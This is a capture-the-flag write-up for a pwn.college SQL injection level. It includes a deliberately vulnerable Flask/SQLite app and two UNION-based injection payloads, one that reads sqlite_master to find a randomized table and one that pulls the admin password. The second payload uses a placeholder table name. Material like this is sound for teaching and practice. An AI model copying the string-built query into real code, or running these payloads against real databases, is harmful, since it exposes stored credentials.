This is similar to the previous level, except this time, the `users` table name is randomized and is not shown on the website.

```python
#!/opt/pwn.college/python

import random
import flask
import os

app = flask.Flask(__name__)

import sqlite3
import tempfile

class TemporaryDB:
    def __init__(self):
        self.db_file = tempfile.NamedTemporaryFile("x", suffix=".db")

    def execute(self, sql, parameters=()):
        connection = sqlite3.connect(self.db_file.name)
        connection.row_factory = sqlite3.Row
        cursor = connection.cursor()
        result = cursor.execute(sql, parameters)
        connection.commit()
        return result

db = TemporaryDB()

random_user_table = f"users_{random.randrange(2**32, 2**33)}"
db.execute(f"""CREATE TABLE {random_user_table} AS SELECT "admin" AS username, ? as password""", [open("/flag").read()])

# https://www.sqlite.org/lang_insert.html
db.execute(f"""INSERT INTO {random_user_table} SELECT "guest" as username, "password" as password""")

@app.route("/", methods=["GET"])
def challenge():
    query = flask.request.args.get("query", "%")

    try:
        # https://www.sqlite.org/schematab.html
        # https://www.sqlite.org/lang_select.html
        sql = f'SELECT username FROM {random_user_table} WHERE username LIKE "{query}"'
        print(f"DEBUG: {query=}")
        results = "\n".join(user["username"] for user in db.execute(sql).fetchall())
    except sqlite3.Error as e:
        results = f"SQL error: {e}"

    return f"""
        <html><body>Welcome to the user query service!
        <form>Query:<input type=text name=query value='{query}'><input type=submit value=Submit></form>
        <hr>
        <b>Query:</b> <pre>{ sql.replace(random_user_table, "REDACTED") }</pre><br>
        <b>Results:</b><pre>{results}</pre>
        </body></html>
        """

app.secret_key = os.urandom(8)
app.config["SERVER_NAME"] = f"challenge.localhost:80"
app.run("challenge.localhost", 80)
```

We need to somehow find the name of the `users` table. For that, we can query the `sqlite_master` table to get the name of the tables in the current database.

```
Query: admin" UNION SELECT name FROM sqlite_master WHERE type='table'--
```

This will give us the name of the `users` table, with that, we can query that table for the password associated with the `admin` account:

```
Query: admin" UNION SELECT password FROM user_1234 where username='admin'--
```